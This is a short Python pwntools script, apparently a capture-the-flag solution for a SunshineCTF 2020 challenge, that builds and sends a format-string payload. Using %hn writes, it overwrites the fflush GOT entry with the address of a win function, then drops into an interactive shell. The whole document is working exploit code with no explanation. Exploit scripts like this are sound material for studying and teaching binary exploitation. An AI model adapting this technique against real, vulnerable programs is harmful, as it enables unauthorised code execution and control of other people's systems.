from pwn import *

# sh = remote('chal.2020.sunshinectf.org', 30011)
sh = process('./chall_11')

p1 = 'abc'

win = 0x80484e6
win1 = win & 0xffff
win2 = (win & 0xffff0000) >> (4 * 4)

fflush = 0x8049918
fflush1 = fflush
fflush2 = fflush1 + 2

payload = b'AAAA' + p32(fflush2) + p32(fflush1)
n_sent = len(payload)

payload += "%{}x".format(win2 - n_sent).encode() + b'%7$hn'
n_sent = win2

payload += "%{}x".format(win1 - n_sent).encode() + b'%8$hn'

with open('payload', 'w') as f:
    f.write(p1 + '\n')

with open('payload', 'ab') as f:
    f.write(payload)

sh.recvline()
sh.sendline(p1)

sh.sendline(payload)
sh.interactive()
